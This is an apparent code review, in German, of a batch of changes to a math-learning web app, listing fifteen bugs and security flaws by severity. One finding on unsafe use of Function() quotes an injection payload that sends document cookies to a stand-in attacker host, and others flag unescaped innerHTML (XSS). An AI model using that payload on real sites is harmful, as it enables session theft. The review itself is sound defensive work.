# Code-Review: Session 2026-06-28 (Batches F–H)

15 Dateien, ~1100 Zeilen neu. Scope: `a0e7108` … `4baf712`.

---

## 🔴 Kritisch (Feature kaputt / Security)

### 1. `resolveApiKey` undefined — formulaPhotoToLatex tot
`pwa/js/ai-service.js:1420`
```js
const { apiKey } = resolveApiKey(config);
```
Jeder andere AI-Aufruf nutzt `await getConfig(config)`. `resolveApiKey`
existiert nirgends. Feature wirft sofort ReferenceError. → Foto→LaTeX
unbenutzbar.

### 2. Recents-Navigation kaputt
`pwa/js/screens/home.js:123`
```js
const nav = `quiz-modes?quizId=${r.id}`;
html += `<div class="quiz-row" data-nav="${nav}">`;
// → navigate("quiz-modes?quizId=abc") → Router findet nix
```
Der Router interpretiert den kompletten String (inkl. Query) als Screen-Name.
Alle Quiz-/Formel-/Plan-Recents führen zu "Screen not found".

### 3. askTutor falsche Argument-Reihenfolge (2×)
`pwa/js/screens/math-tools.js:147, 249`
```js
const res = await askTutor(
  "Frage...",
  { model: "deepseek/deepseek-chat" }   // ← context, nicht config!
);
```
Signatur: `askTutor(q, context="", history=[], config={})`. Config landet
in context → String "[object Object]" im System-Prompt. Modell ignoriert.
Betrifft Einheiten-Checker + Herleitungen.

### 4. Code Injection via Function()
`pwa/js/screens/math-tools.js:197`
```js
const result = Function(`"use strict"; return (${expr});`)();
// expr = user input, kein Whitelisting
```
Eingabe `1);fetch('https://evil.com?'+document.cookie)//` → beliebiger Code
läuft im Seitenkontext. `quiz-engine.js` hat mit `evalMath()` eine sichere
Variante.

---

## 🟠 Hoch (Browser-spezifisch / Datenverlust)

### 5. XSS: innerHTML mit rohem KI-Text
`pwa/js/screens/math-tools.js:151`
```js
resultEl.innerHTML = res;   // raw AI response
```
`initDerive` macht es korrekt mit `mathEsc(res)`. In `initUnits` vergessen.

### 6. XSS: unescaped Formeln im PDF-Export
`pwa/js/screens/formula-sheets.js:432, 439`
```js
<div>${f.formula}</div>              // kein esc()
bodyHtml = lines.map(l => `<div>${l}</div>`)  // kein esc()
```

### 7. Firefox: .tex-Download schlägt still fehl
`pwa/js/screens/formula-sheets.js:522`
```js
const a = document.createElement("a");
a.click();                       // Anchor nie im DOM!
URL.revokeObjectURL(a.href);
```
`html-export.js` macht korrekt `document.body.appendChild(a)` vor `click()`.
Firefox ignoriert detached-anchor clicks.

### 8. trackRecent Race Condition
`pwa/js/store.js:227`
```js
export async function trackRecent(...) {
  const recents = await loadRecents();   // Read
  // modify...
  await set("recents", ...);             // Write (no lock)
}
```
5 Screens rufen fire-and-forget. Zwei parallele Calls → letzter Write
überschreibt ersten → Eintrag verschwindet.

---

## 🟡 Mittel (Edge Cases)

### 9. loadRecents: kein Typ-Check
`pwa/js/store.js:225`
`?? []` fängt nur null/undefined. Corrupter Store-Wert → `.filter()` wirft
TypeError.

### 10. Floating Promise in exercise-mode
`pwa/js/screens/exercise-mode.js:109`
`import("../math-keyboard.js").then(...)` ohne `.catch()`.

### 11. Datenverlust bei Mode-Switch
`pwa/js/screens/exercise-mode.js:320`
Wechsel zu Bild-Modus speichert `userSolution` nicht. Text↔Keyboard tun es.

### 12. Lost Dedup in Bild-Chunking
`pwa/js/ai-service.js:600`
Alter Code: `coveredTopics.push(...new Set(newTopics))`. Neuer Code pushed
Roh-Summaries ohne Dedup.

### 13. home.js: loadRecents ohne Error-Isolation
`pwa/js/screens/home.js:8`
Promise.all mit neuem Key → kann crashen → weißer Home-Screen.

### 14. checkExerciseSolution verwirft Bild still
`pwa/js/ai-service.js:1387`
Kein Vision-Modell → Bild wird ignoriert, keine Warnung an User.

---

## ⚪ Low

### 15. CLAUDE.md nicht aktualisiert
Neue Screens/Features fehlen im Projekt-Dokumentation.
